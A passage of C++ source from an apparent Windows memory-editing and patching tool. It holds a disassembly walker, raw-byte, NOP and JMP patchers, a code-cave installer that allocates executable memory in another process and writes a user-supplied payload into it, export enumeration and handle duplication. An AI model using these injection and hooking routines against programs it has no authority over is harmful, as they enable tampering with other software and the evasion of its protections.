        (unsigned long long)(offset >= 0 ? offset : -offset),
        (unsigned long long)startAddr,
        (unsigned long long)(startAddr + (uintptr_t)viewSize),
        viewSize);
    AppendEditText(hLstDwDisasm, hdr);
    AppendEditText(hLstDwDisasm, "");

    std::vector<BYTE> buf(viewSize);
    SIZE_T r = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)startAddr, buf.data(), viewSize, &r) || r == 0) {
        AppendEditText(hLstDwDisasm, "[read failed - address not readable or unmapped]");
        LogToStatus("Walker: read failed", true);
        return;
    }
    if (r < (SIZE_T)viewSize) {
        char w[160];
        sprintf_s(w, "[partial read: %zu of %d bytes - end of region reached]", r, viewSize);
        AppendEditText(hLstDwDisasm, w);
    }

    AppendEditText(hLstDwDisasm, "--- HEX DUMP ---");
    AppendEditText(hLstDwDisasm,
        "Address              | 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ASCII");
    AppendEditText(hLstDwDisasm,
        "---------------------+-------------------------------------------------+-----------------");
    for (size_t i = 0; i < r; i += 16) {
        char line[320] = {};
        sprintf_s(line, "0x%016llX | ", (unsigned long long)(startAddr + i));
        char asc[20] = {};
        for (int j = 0; j < 16; j++) {
            if (i + j < r) {
                char h[4]; sprintf_s(h, "%02X ", buf[i + j]);
                strcat_s(line, h);
                asc[j] = (buf[i + j] >= 32 && buf[i + j] < 127) ? (char)buf[i + j] : '.';
            } else {
                strcat_s(line, "   ");
                asc[j] = ' ';
            }
        }
        asc[16] = 0;
        strcat_s(line, "| "); strcat_s(line, asc);
        uintptr_t rowAddr = startAddr + i;
        if (target >= rowAddr && target < rowAddr + 16) {
            char m[80];
            sprintf_s(m, "  <-- target (+0x%llX into row)", (unsigned long long)(target - rowAddr));
            strcat_s(line, m);
        }
        AppendEditText(hLstDwDisasm, line);
    }

    AppendEditText(hLstDwDisasm, "");
    AppendEditText(hLstDwDisasm, "--- ZYDIS DISASSEMBLY ---");
    AppendEditText(hLstDwDisasm,
        "  Address              Bytes                       Instruction");
    AppendEditText(hLstDwDisasm,
        "  -------------------+---------------------------+-----------------------------------");
    size_t pos = 0;
    int instrCount = 0;
    const int maxInstr = 1024;
    while (pos < r && instrCount < maxInstr) {
        char instr[200] = {};
        int n = DisasmOne(buf.data() + pos, r - pos, startAddr + pos, instr, sizeof(instr));
        if (n <= 0) n = 1;

        char hex[64] = {}; int hp = 0;
        for (int b = 0; b < n && hp < (int)sizeof(hex) - 4; b++)
            hp += sprintf_s(hex + hp, sizeof(hex) - hp, "%02X ", buf[pos + b]);

        const char* flag = "";
        if (strstr(instr, "syscall"))     flag = "  <-- SYSCALL";
        else if (strstr(instr, "int3"))   flag = "  <-- INT3";
        else if (strstr(instr, "gs:"))    flag = "  <-- TEB/PEB";
        else if (strstr(instr, "call"))   flag = "  <-- CALL";
        else if (strncmp(instr, "ret", 3) == 0) flag = "  <-- RET";
        else if (strstr(instr, "ud2"))    flag = "  <-- UD2 (likely data)";

        char tgtMark[16] = "";
        uintptr_t insAddr = startAddr + pos;
        if (target >= insAddr && target < insAddr + (uintptr_t)n)
            strcpy_s(tgtMark, "  <<<");

        char line[480];
        sprintf_s(line, "  0x%016llX  %-27s %s%s%s",
            (unsigned long long)insAddr, hex, instr, flag, tgtMark);
        AppendEditText(hLstDwDisasm, line);

        pos += n;
        instrCount++;
    }

    AppendEditText(hLstDwDisasm, "");
    char done[180];
    sprintf_s(done, "Walker: %d instruction(s) decoded across %zu bytes", instrCount, r);
    AppendEditText(hLstDwDisasm, done);
    LogToStatus(done);
}

void DisasmWalkerAdjustOffset(intptr_t delta) {
    char offStr[32] = {};
    GetWindowTextA(hEditDwOffset, offStr, sizeof(offStr));
    int64_t cur = strtoll(offStr, nullptr, 0);
    int64_t next = cur + (int64_t)delta;
    char buf[40];
    if (next < 0) sprintf_s(buf, "-0x%llX", (unsigned long long)(-next));
    else          sprintf_s(buf, "0x%llX",  (unsigned long long)next);
    SetWindowTextA(hEditDwOffset, buf);
    DisasmWalkerRefresh();
}

void AddAutoPtrScanToChains() {
    if (g_lastAutoPtrScan.empty()) { LogToStatus("No scan results to add", true); return; }
    int added = 0;
    for (size_t i = 0; i < g_lastAutoPtrScan.size() && added < 200; i++) {
        AutoPtrScanResult& f = g_lastAutoPtrScan[i];
        PointerChain c;
        char nm[64];
        sprintf_s(nm, "auto_%d_%s", (int)(g_chains.size() + added), f.moduleName.c_str());
        c.name = nm;
        c.moduleName = f.moduleName;
        c.baseOffset = f.baseOff;
        c.offsets = f.offsets;
        g_chains.push_back(c);
        added++;
    }
    char msg[128];
    sprintf_s(msg, "Added %d chain(s) to manager (Pointers & Hooks tab)", added);
    LogToStatus(msg);
    RefreshChainsUI();
}

static uintptr_t PatcherParseAddr(HWND hEdit) {
    char buf[64] = {};
    GetWindowTextA(hEdit, buf, sizeof(buf));
    return (uintptr_t)strtoull(buf, nullptr, 0);
}

static int PatcherParseInt(HWND hEdit, int defv) {
    char buf[32] = {};
    GetWindowTextA(hEdit, buf, sizeof(buf));
    if (!buf[0]) return defv;
    return (int)strtoul(buf, nullptr, 0);
}


static bool PatcherWriteRemote(LPVOID addr, const BYTE* data, SIZE_T sz) {
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProcess, addr, sz, PAGE_EXECUTE_READWRITE, &oldProt)) {
        LogToStatus("VirtualProtectEx failed at target", true);
        return false;
    }
    SIZE_T w = 0;
    BOOL ok = WriteProcessMemory(hProcess, addr, data, sz, &w);
    VirtualProtectEx(hProcess, addr, sz, oldProt, &oldProt);
    if (!ok || w != sz) { LogToStatus("WriteProcessMemory failed", true); return false; }
    FlushInstructionCache(hProcess, addr, sz);
    return true;
}


static bool PatcherReadRemote(LPVOID addr, SIZE_T sz, std::vector<BYTE>& out) {
    out.assign(sz, 0);
    SIZE_T r = 0;
    if (!ReadProcessMemory(hProcess, addr, out.data(), sz, &r) || r != sz) {
        LogToStatus("ReadProcessMemory failed", true);
        return false;
    }
    return true;
}

static void PatcherRecord(const PatchRecord& pr) {
    g_patches.push_back(pr);
    PatcherRefreshList();
}

void PatcherRefreshList() {
    if (!hLstPatches) return;
    ClearEditText(hLstPatches);
    AppendEditText(hLstPatches,
        "Idx  Status     Kind         Target              Size   Cave                Description");
    AppendEditText(hLstPatches,
        "-----+----------+------------+-------------------+------+-------------------+-------------------");
    for (int i = 0; i < (int)g_patches.size(); i++) {
        PatchRecord& p = g_patches[i];
        char line[400];
        sprintf_s(line, "[%2d] %-9s  %-11s  0x%016llX  %5zu  0x%016llX  %s",
            i,
            p.installed ? "ACTIVE" : "RESTORED",
            p.kind.c_str(),
            (unsigned long long)(uintptr_t)p.target,
            p.patchSize,
            (unsigned long long)(uintptr_t)p.caveAddr,
            p.description.c_str());
        AppendEditText(hLstPatches, line);
    }
}

void PatcherReadAndShow() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t addr = PatcherParseAddr(hEditPatchAddr);
    int sz = PatcherParseInt(hEditPatchSize, 32);
    if (!addr || sz <= 0 || sz > 1024) {
        LogToStatus("Invalid address or size (1..1024)", true); return;
    }
    std::vector<BYTE> buf;
    if (!PatcherReadRemote((LPVOID)addr, sz, buf)) return;
    std::string hex; hex.reserve(sz * 3);
    char tmp[8];
    for (int i = 0; i < sz; i++) {
        sprintf_s(tmp, "%02X ", buf[i]);
        hex += tmp;
    }
    SetWindowTextA(hEditPatchBytes, hex.c_str());
    char msg[128]; sprintf_s(msg, "Read %d bytes from 0x%llX", sz, (unsigned long long)addr);
    LogToStatus(msg);
}

void PatcherDisassembleAtAddr() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t addr = PatcherParseAddr(hEditPatchAddr);
    int sz = PatcherParseInt(hEditPatchSize, 32);
    if (!addr || sz <= 0 || sz > 1024) {
        LogToStatus("Invalid address or size (1..1024)", true); return;
    }
    std::vector<BYTE> buf;
    if (!PatcherReadRemote((LPVOID)addr, sz, buf)) return;

    std::string out;
    size_t pos = 0;
    char line[256], instr[200];
    int safety = 0;
    while (pos < buf.size() && safety++ < 128) {
        int consumed = DisasmOne(buf.data() + pos, buf.size() - pos,
                                 (uint64_t)addr + pos, instr, sizeof(instr));
        if (consumed <= 0) consumed = 1;
        char hex[64] = {}; int hp = 0;
        for (int i = 0; i < consumed && hp < (int)sizeof(hex) - 3; i++)
            hp += sprintf_s(hex + hp, sizeof(hex) - hp, "%02X ", buf[pos + i]);
        sprintf_s(line, "%016llX  %-24s %s\r\n",
            (unsigned long long)(addr + pos), hex, instr);
        out += line;
        pos += consumed;
    }
    SetWindowTextA(hEditPatchDisasm, out.c_str());
    LogToStatus("Disassembly updated");
}

void PatcherWriteRawBytes() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t addr = PatcherParseAddr(hEditPatchAddr);
    if (!addr) { LogToStatus("Enter a target address (hex 0x...)", true); return; }

    char hexBuf[8192] = {};
    GetWindowTextA(hEditPatchPayload, hexBuf, sizeof(hexBuf));
    std::vector<BYTE> bytes; std::vector<bool> mask;
    if (!ParseAOB(hexBuf, bytes, mask) || bytes.empty()) {
        LogToStatus("Enter payload bytes (e.g. 90 90 90)", true); return;
    }

    std::vector<BYTE> orig;
    if (!PatcherReadRemote((LPVOID)addr, bytes.size(), orig)) return;
    if (!PatcherWriteRemote((LPVOID)addr, bytes.data(), bytes.size())) return;

    PatchRecord pr;
    pr.target = (LPVOID)addr;
    pr.patchSize = bytes.size();
    pr.originalBytes = orig;
    pr.installed = true;
    pr.kind = "Bytes";
    char d[128]; sprintf_s(d, "raw write %zu B", bytes.size());
    pr.description = d;
    PatcherRecord(pr);

    char msg[160];
    sprintf_s(msg, "Wrote %zu byte(s) at 0x%llX", bytes.size(), (unsigned long long)addr);
    LogToStatus(msg);
}

void PatcherNopOut() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t addr = PatcherParseAddr(hEditPatchAddr);
    int n = PatcherParseInt(hEditPatchNopLen, 0);
    if (!addr) { LogToStatus("Enter a target address", true); return; }
    if (n <= 0 || n > 4096) { LogToStatus("NOP length 1..4096", true); return; }

    std::vector<BYTE> orig;
    if (!PatcherReadRemote((LPVOID)addr, n, orig)) return;
    std::vector<BYTE> nops(n, 0x90);
    if (!PatcherWriteRemote((LPVOID)addr, nops.data(), n)) return;

    PatchRecord pr;
    pr.target = (LPVOID)addr;
    pr.patchSize = n;
    pr.originalBytes = orig;
    pr.installed = true;
    pr.kind = "NOP";
    char d[96]; sprintf_s(d, "NOP-out %d B", n);
    pr.description = d;
    PatcherRecord(pr);

    char msg[160];
    sprintf_s(msg, "NOP'd %d byte(s) at 0x%llX", n, (unsigned long long)addr);
    LogToStatus(msg);
}

void PatcherShortJmp() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t src = PatcherParseAddr(hEditPatchAddr);
    uintptr_t dst = PatcherParseAddr(hEditPatchJmpTarget);
    if (!src || !dst) { LogToStatus("Enter both source and jump-to addresses", true); return; }

    int64_t rel = (int64_t)dst - (int64_t)(src + 2);
    if (rel < -128 || rel > 127) {
        LogToStatus("Short JMP out of range (-128..+127). Use Near JMP instead.", true);
        return;
    }
    BYTE patch[2] = { 0xEB, (BYTE)(int8_t)rel };

    std::vector<BYTE> orig;
    if (!PatcherReadRemote((LPVOID)src, 2, orig)) return;
    if (!PatcherWriteRemote((LPVOID)src, patch, 2)) return;

    PatchRecord pr;
    pr.target = (LPVOID)src;
    pr.patchSize = 2;
    pr.originalBytes = orig;
    pr.installed = true;
    pr.kind = "JMP-short";
    char d[128];
    sprintf_s(d, "EB %02X  -> 0x%llX", (BYTE)(int8_t)rel, (unsigned long long)dst);
    pr.description = d;
    PatcherRecord(pr);

    char msg[160];
    sprintf_s(msg, "Short JMP installed: 0x%llX -> 0x%llX",
        (unsigned long long)src, (unsigned long long)dst);
    LogToStatus(msg);
}

void PatcherNearJmp() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t src = PatcherParseAddr(hEditPatchAddr);
    uintptr_t dst = PatcherParseAddr(hEditPatchJmpTarget);
    if (!src || !dst) { LogToStatus("Enter both source and jump-to addresses", true); return; }

    int64_t rel = (int64_t)dst - (int64_t)(src + 5);
    if (rel < INT32_MIN || rel > INT32_MAX) {
        LogToStatus("Near JMP rel32 out of range. Use a code cave for absolute jmp.", true);
        return;
    }
    BYTE patch[5];
    patch[0] = 0xE9;
    int32_t rel32 = (int32_t)rel;
    memcpy(patch + 1, &rel32, 4);

    std::vector<BYTE> orig;
    if (!PatcherReadRemote((LPVOID)src, 5, orig)) return;
    if (!PatcherWriteRemote((LPVOID)src, patch, 5)) return;

    PatchRecord pr;
    pr.target = (LPVOID)src;
    pr.patchSize = 5;
    pr.originalBytes = orig;
    pr.installed = true;
    pr.kind = "JMP-near";
    char d[128];
    sprintf_s(d, "E9 rel32 -> 0x%llX", (unsigned long long)dst);
    pr.description = d;
    PatcherRecord(pr);

    char msg[160];
    sprintf_s(msg, "Near JMP installed: 0x%llX -> 0x%llX",
        (unsigned long long)src, (unsigned long long)dst);
    LogToStatus(msg);
}

void PatcherInstallCodeCave() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    uintptr_t target = PatcherParseAddr(hEditPatchAddr);
    if (!target) { LogToStatus("Enter a target address", true); return; }

    char scStr[8192] = {};
    GetWindowTextA(hEditPatchPayload, scStr, sizeof(scStr));
    std::vector<BYTE> userSc; std::vector<bool> userMask;
    if (!ParseAOB(scStr, userSc, userMask)) userSc.clear();

    int reqCave = PatcherParseInt(hEditPatchCaveSize, 256);
    if (reqCave < 64) reqCave = 64;
    if (reqCave > 65536) reqCave = 65536;

    const SIZE_T patchSize  = 14;
    const SIZE_T jmpBackSz  = 14;

    std::vector<BYTE> orig;
    if (!PatcherReadRemote((LPVOID)target, patchSize, orig)) return;

    SIZE_T needed = userSc.size() + patchSize + jmpBackSz;
    SIZE_T caveSize = (SIZE_T)reqCave;
    if (caveSize < needed) caveSize = needed;

    LPVOID cave = VirtualAllocEx(hProcess, nullptr, caveSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!cave) { LogToStatus("VirtualAllocEx (cave) failed", true); return; }

    std::vector<BYTE> caveBuf(caveSize, 0x90);
    if (!userSc.empty())
        memcpy(caveBuf.data(), userSc.data(), userSc.size());
    memcpy(caveBuf.data() + userSc.size(), orig.data(), patchSize);

    uintptr_t backAddr = target + patchSize;
    BYTE* jb = caveBuf.data() + userSc.size() + patchSize;
    jb[0] = 0xFF; jb[1] = 0x25;
    jb[2] = jb[3] = jb[4] = jb[5] = 0;
    memcpy(jb + 6, &backAddr, 8);

    SIZE_T w = 0;
    if (!WriteProcessMemory(hProcess, cave, caveBuf.data(), caveSize, &w) || w != caveSize) {
        VirtualFreeEx(hProcess, cave, 0, MEM_RELEASE);
        LogToStatus("Failed to write cave contents", true); return;
    }

    BYTE patch[14];
    patch[0] = 0xFF; patch[1] = 0x25;
    patch[2] = patch[3] = patch[4] = patch[5] = 0;
    uintptr_t caveU = (uintptr_t)cave;
    memcpy(patch + 6, &caveU, 8);
    if (!PatcherWriteRemote((LPVOID)target, patch, patchSize)) {
        VirtualFreeEx(hProcess, cave, 0, MEM_RELEASE);
        return;
    }

    PatchRecord pr;
    pr.target = (LPVOID)target;
    pr.patchSize = patchSize;
    pr.originalBytes = orig;
    pr.caveAddr = cave;
    pr.caveSize = caveSize;
    pr.installed = true;
    pr.kind = "Cave";
    char d[160];
    sprintf_s(d, "abs JMP -> cave (payload=%zu B, cave=%zu B)", userSc.size(), caveSize);
    pr.description = d;
    PatcherRecord(pr);

    char msg[200];
    sprintf_s(msg, "Code cave installed: target=0x%llX cave=0x%llX",
        (unsigned long long)target, (unsigned long long)caveU);
    LogToStatus(msg);
}

void PatcherRestoreSelected() {
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    DWORD sel = 0;
    SendMessage(hLstPatches, EM_GETSEL, (WPARAM)&sel, 0);
    int li = (int)SendMessage(hLstPatches, EM_LINEFROMCHAR, (WPARAM)sel, 0);
    int idx = li - 2;  
    if (idx < 0 || idx >= (int)g_patches.size()) {
        LogToStatus("Click a patch row first", true); return;
    }
    PatchRecord& p = g_patches[idx];
    if (!p.installed) { LogToStatus("Patch already restored", true); return; }
    if (!PatcherWriteRemote(p.target, p.originalBytes.data(), p.patchSize)) return;
    if (p.caveAddr) {
        VirtualFreeEx(hProcess, p.caveAddr, 0, MEM_RELEASE);
        p.caveAddr = nullptr;
    }
    p.installed = false;
    LogToStatus("Patch restored");
    PatcherRefreshList();
}

void EnumerateExports() {
    g_exports.clear();
    if (!hProcess) { LogToStatus("Attach to a process first", true); return; }
    HMODULE mods[1024]; DWORD needed = 0;
    if (!EnumProcessModules(hProcess, mods, sizeof(mods), &needed)) {
        LogToStatus("EnumProcessModules failed", true); return;
    }
    DWORD count = needed / sizeof(HMODULE);

    for (DWORD i = 0; i < count; i++) {
        char path[MAX_PATH] = {};
        GetModuleFileNameExA(hProcess, mods[i], path, MAX_PATH);
        const char* nm = strrchr(path, '\\'); nm = nm ? nm + 1 : path;
        std::string modName = nm;

        IMAGE_DOS_HEADER dos = {};
        SIZE_T r = 0;
        if (!ReadProcessMemory(hProcess, mods[i], &dos, sizeof(dos), &r) || r != sizeof(dos)) continue;
        if (dos.e_magic != IMAGE_DOS_SIGNATURE) continue;
        IMAGE_NT_HEADERS nt = {};
        if (!ReadProcessMemory(hProcess, (BYTE*)mods[i] + dos.e_lfanew, &nt, sizeof(nt), &r) ||
            r != sizeof(nt)) continue;
        if (nt.Signature != IMAGE_NT_SIGNATURE) continue;
        IMAGE_DATA_DIRECTORY& ed = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (ed.Size == 0 || ed.VirtualAddress == 0) continue;

        IMAGE_EXPORT_DIRECTORY exp = {};
        if (!ReadProcessMemory(hProcess, (BYTE*)mods[i] + ed.VirtualAddress, &exp, sizeof(exp), &r) ||
            r != sizeof(exp)) continue;
        DWORD nFuncs = exp.NumberOfFunctions;
        DWORD nNames = exp.NumberOfNames;
        if (nFuncs == 0 || nFuncs > 200000) continue;

        std::vector<DWORD> funcTbl(nFuncs);
        ReadProcessMemory(hProcess, (BYTE*)mods[i] + exp.AddressOfFunctions,
                          funcTbl.data(), nFuncs * sizeof(DWORD), &r);
        if (nNames > 0 && nNames < 200000) {
            std::vector<DWORD> nameTbl(nNames);
            std::vector<WORD>  ordTbl(nNames);
            ReadProcessMemory(hProcess, (BYTE*)mods[i] + exp.AddressOfNames,
                              nameTbl.data(), nNames * sizeof(DWORD), &r);
            ReadProcessMemory(hProcess, (BYTE*)mods[i] + exp.AddressOfNameOrdinals,
                              ordTbl.data(), nNames * sizeof(WORD), &r);
            for (DWORD j = 0; j < nNames; j++) {
                char name[256] = {};
                ReadProcessMemory(hProcess, (BYTE*)mods[i] + nameTbl[j], name, sizeof(name) - 1, &r);
                ExportEntry e;
                e.moduleName = modName;
                e.funcName   = name;
                e.ordinal    = ordTbl[j] + exp.Base;
                e.address    = (LPVOID)((BYTE*)mods[i] + funcTbl[ordTbl[j]]);
                g_exports.push_back(e);
            }
        }
    }
    char msg[128];
    sprintf_s(msg, "Enumerated %zu export(s) across %lu module(s)",
        g_exports.size(), count);
    LogToStatus(msg);
    RefreshExportsUI();
}

void RefreshExportsUI() {
    if (!hLstExports) return;
    ClearEditText(hLstExports);
    char filter[128] = {};
    GetWindowTextA(hEditExpFilter, filter, sizeof(filter));
    std::string fl = filter;
    std::transform(fl.begin(), fl.end(), fl.begin(), ::tolower);

    AppendEditText(hLstExports, "Module             Ordinal  Address              Function");
    AppendEditText(hLstExports, "-------------------+--------+--------------------+--------------------");
    int n = 0;
    for (auto& e : g_exports) {
        if (!fl.empty()) {
            std::string a = e.funcName, b = e.moduleName;
            std::transform(a.begin(), a.end(), a.begin(), ::tolower);
            std::transform(b.begin(), b.end(), b.begin(), ::tolower);
            if (a.find(fl) == std::string::npos && b.find(fl) == std::string::npos) continue;
        }
        char line[512];
        sprintf_s(line, "%-19s %6lu  0x%016llX  %s",
            e.moduleName.c_str(), e.ordinal,
            (unsigned long long)(uintptr_t)e.address, e.funcName.c_str());
        AppendEditText(hLstExports, line);
        n++;
        if (n >= 20000) {
            AppendEditText(hLstExports, "... (truncated at 20000; refine filter)");
            break;
        }
    }
    char msg[128]; sprintf_s(msg, "Showing %d export(s) (filter: \"%s\")", n, filter);
    LogToStatus(msg);
}

void GoToSelectedExport() {
    DWORD sel = 0;
    SendMessage(hLstExports, EM_GETSEL, (WPARAM)&sel, 0);
    int li = (int)SendMessage(hLstExports, EM_LINEFROMCHAR, (WPARAM)sel, 0);
    int ls = (int)SendMessage(hLstExports, EM_LINEINDEX, (WPARAM)li, 0);
    int ll = (int)SendMessage(hLstExports, EM_LINELENGTH, (WPARAM)ls, 0);
    if (ll <= 0 || ll >= 512) { LogToStatus("Click an export line first", true); return; }
    std::string buf(ll + 2, '\0');
    buf[0] = (char)(ll & 0xFF); buf[1] = (char)((ll >> 8) & 0xFF);
    SendMessageA(hLstExports, EM_GETLINE, (WPARAM)li, (LPARAM)&buf[0]);
    const char* p = strstr(buf.c_str(), "0x");
    if (!p) { LogToStatus("No address on this line", true); return; }
    LPVOID addr = (LPVOID)strtoull(p, nullptr, 16);
    if (!addr) { LogToStatus("Invalid address parsed", true); return; }
    SetSelectedAddress(addr);
    char info[256]; sprintf_s(info, "Selected (export): 0x%p", addr);
    SetWindowTextA(hStaticAddressInfo, info);
    char hex[32]; sprintf_s(hex, "0x%llX", (uintptr_t)addr);
    SetWindowTextA(hEditScAddr, hex);
    ShowHexAtAddress(addr, addr);
    TabCtrl_SetCurSel(hTabCtrl, 0);
    ShowWindow(hPageScan, SW_SHOW);
    ShowWindow(hPageMods, SW_HIDE); ShowWindow(hPageInject, SW_HIDE);
    ShowWindow(hPageWnd, SW_HIDE); ShowWindow(hPageDetect, SW_HIDE);
    ShowWindow(hPageShellcode, SW_HIDE); ShowWindow(hPageVerify, SW_HIDE);
    ShowWindow(hPageTrigger, SW_HIDE);
    if (hPagePtrHook) ShowWindow(hPagePtrHook, SW_HIDE);
    if (hPageExpHnd)  ShowWindow(hPageExpHnd, SW_HIDE);
    if (hPagePatcher) ShowWindow(hPagePatcher, SW_HIDE);
    if (hPageAutoPtr) ShowWindow(hPageAutoPtr, SW_HIDE);
    if (hPageDisasmWalk) ShowWindow(hPageDisasmWalk, SW_HIDE);
    LogToStatus("Jumped to export in hex view (Scanner tab)");
}

typedef struct _MEMI_SYS_HANDLE {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} MEMI_SYS_HANDLE;
typedef struct _MEMI_SYS_HANDLE_INFO {
    ULONG HandleCount;
    MEMI_SYS_HANDLE Handles[1];
} MEMI_SYS_HANDLE_INFO;

typedef NTSTATUS (WINAPI* tNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (WINAPI* tNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef struct _MEMI_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } MEMI_UNICODE_STRING;

void EnumerateHandles() {
    g_handles.clear();
    if (!currentPID) { LogToStatus("Attach to a process first", true); return; }
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (!hNt) { LogToStatus("ntdll missing", true); return; }
    tNtQuerySystemInformation pNQSI = (tNtQuerySystemInformation)GetProcAddress(hNt, "NtQuerySystemInformation");
    tNtQueryObject pNQO = (tNtQueryObject)GetProcAddress(hNt, "NtQueryObject");
    if (!pNQSI || !pNQO) { LogToStatus("ntdll exports unavailable", true); return; }

    ULONG bufSize = 0x10000;
    std::vector<BYTE> buf;
    NTSTATUS s = (NTSTATUS)0xC0000004;  
    for (int tries = 0; tries < 12; tries++) {
        buf.assign(bufSize, 0);
        ULONG ret = 0;
        s = pNQSI(0x10 /*SystemHandleInformation*/, buf.data(), bufSize, &ret);
        if (s == 0) break;
        bufSize *= 2;
        if (bufSize > 0x10000000) break;
    }
    if (s != 0) { LogToStatus("NtQuerySystemInformation failed", true); return; }

    MEMI_SYS_HANDLE_INFO* shi = (MEMI_SYS_HANDLE_INFO*)buf.data();
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, currentPID);
    if (!hProc) { LogToStatus("OpenProcess(PROCESS_DUP_HANDLE) failed", true); return; }

    for (ULONG i = 0; i < shi->HandleCount; i++) {
        MEMI_SYS_HANDLE& e = shi->Handles[i];
        if (e.UniqueProcessId != (USHORT)currentPID) continue;

        HandleInfoEntry he;
        he.handleValue   = e.HandleValue;
        he.objType       = e.ObjectTypeIndex;
        he.object        = e.Object;
        he.grantedAccess = e.GrantedAccess;

        HANDLE dup = NULL;
        BOOL ok = DuplicateHandle(hProc, (HANDLE)(uintptr_t)e.HandleValue,
                                  GetCurrentProcess(), &dup, 0, FALSE, DUPLICATE_SAME_ACCESS);
        if (ok && dup) {
            BYTE typeBuf[1024] = {};
            ULONG tlen = 0;
            if (pNQO(dup, 2, typeBuf, sizeof(typeBuf), &tlen) == 0) {
                MEMI_UNICODE_STRING* us = (MEMI_UNICODE_STRING*)typeBuf;
                if (us->Buffer && us->Length > 0 && us->Length < 512) {
                    char tname[256] = {};
                    int n = WideCharToMultiByte(CP_UTF8, 0, us->Buffer, us->Length / 2,
                                                tname, 255, NULL, NULL);
                    if (n > 0) { tname[n] = 0; he.typeName = tname; }
                }
            }

            bool skipName = (he.typeName == "File" && (e.GrantedAccess == 0x0012019F));
            if (!skipName) {
                BYTE nameBuf[2048] = {};
                ULONG nlen = 0;
                if (pNQO(dup, 1, nameBuf, sizeof(nameBuf), &nlen) == 0) {
                    MEMI_UNICODE_STRING* us = (MEMI_UNICODE_STRING*)nameBuf;
                    if (us->Buffer && us->Length > 0 && us->Length < 1024) {
                        char nname[1024] = {};
                        int n = WideCharToMultiByte(CP_UTF8, 0, us->Buffer, us->Length / 2,
                                                    nname, 1023, NULL, NULL);
                        if (n > 0) { nname[n] = 0; he.objName = nname; }
                    }
                }
            } else {
                he.objName = "(File - name skipped to avoid deadlock)";
            }
            CloseHandle(dup);
        }
        g_handles.push_back(he);
    }
    CloseHandle(hProc);

    char msg[128]; sprintf_s(msg, "Enumerated %zu handle(s) for PID %d",
        g_handles.size(), currentPID);
    LogToStatus(msg);
    RefreshHandlesUI();
}

void RefreshHandlesUI() {
    if (!hLstHandles) return;
    ClearEditText(hLstHandles);
    char filter[128] = {};
    GetWindowTextA(hEditHndFilter, filter, sizeof(filter));
    std::string fl = filter;
    std::transform(fl.begin(), fl.end(), fl.begin(), ::tolower);

    AppendEditText(hLstHandles, "Handle   Type             Access     Object              Name");
    AppendEditText(hLstHandles, "--------+----------------+----------+-------------------+-------------------");
    int n = 0;
    for (auto& h : g_handles) {
        if (!fl.empty()) {
            std::string a = h.typeName, b = h.objName;
            std::transform(a.begin(), a.end(), a.begin(), ::tolower);
            std::transform(b.begin(), b.end(), b.begin(), ::tolower);
            if (a.find(fl) == std::string::npos && b.find(fl) == std::string::npos) continue;
        }
        char line[1280];
        sprintf_s(line, "0x%04X   %-16s 0x%08X  0x%016llX  %s",
            h.handleValue, h.typeName.c_str(), h.grantedAccess,
            (unsigned long long)(uintptr_t)h.object, h.objName.c_str());
        AppendEditText(hLstHandles, line);
        n++;
    }
    char msg[128]; sprintf_s(msg, "Showing %d handle(s) (filter: \"%s\")", n, filter);
    LogToStatus(msg);
}

LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    switch(msg){

    case WM_CREATE:{
        hBrushWindow=CreateSolidBrush(CLR_BG_WINDOW);
        hBrushEdit  =CreateSolidBrush(CLR_BG_EDIT);
        hBrushList  =CreateSolidBrush(CLR_BG_LIST);
        hBrushStatus=CreateSolidBrush(CLR_BG_STATUS);

        hFontTitle  =CreateFontA(22,0,0,0,FW_BOLD,  0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,"Segoe UI");
        hFontSection=CreateFontA(15,0,0,0,FW_BOLD,  0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,"Segoe UI");
        hFontNormal =CreateFontA(14,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,"Segoe UI");
        hFontMono   =CreateFontA(14,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,FIXED_PITCH, "Consolas");
        hFontSmall  =CreateFontA(12,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,"Segoe UI");

        auto SF=[&](HWND h,HFONT f){SendMessage(h,WM_SETFONT,(WPARAM)f,TRUE);};
        auto MakeDisplayEdit=[&](int x,int y,int w,int h,int id)->HWND{
            HWND he=CreateWindowA("RichEdit20A","",
                WS_CHILD|WS_VISIBLE|WS_BORDER|WS_VSCROLL|WS_HSCROLL|WS_CLIPSIBLINGS|
